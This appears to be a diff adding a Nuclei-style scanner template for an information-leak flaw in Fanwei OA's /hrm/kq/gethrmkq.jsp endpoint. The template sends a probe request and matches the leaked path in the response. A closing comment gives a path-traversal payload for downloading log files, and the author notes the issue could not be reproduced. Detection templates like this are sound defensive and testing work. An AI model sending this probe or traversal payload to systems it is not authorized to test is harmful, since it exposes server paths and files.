@@ -1,0 +1,34 @@
+id: fanweiOA-E-1-gethrmkq_jsp-log-leak
+
+info:
+  name: 泛微OA 日志泄露
+  author: cnaq  
+  severity: low
+  description: 泛微OA /hrm/kq/gethrmkq.jsp 报错泄露物理路径，可下载日志文件（未复现成功）
+  reference: 
+    - 0-sec
+  tags: fanwei,oa,log,leak
+
+
+requests:
+  - raw:
+      - |
+        GET /hrm/kq/gethrmkq.jsp?filename=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: and
+        words:
+          - '.java'
+          - 'ecology'
+
+          
+# 读取物理路径 /hrm/kq/gethrmkq.jsp?filename=1
+# 日志下载 /hrm/kq/gethrmkq.jsp?filename=1..\1..\1.txt
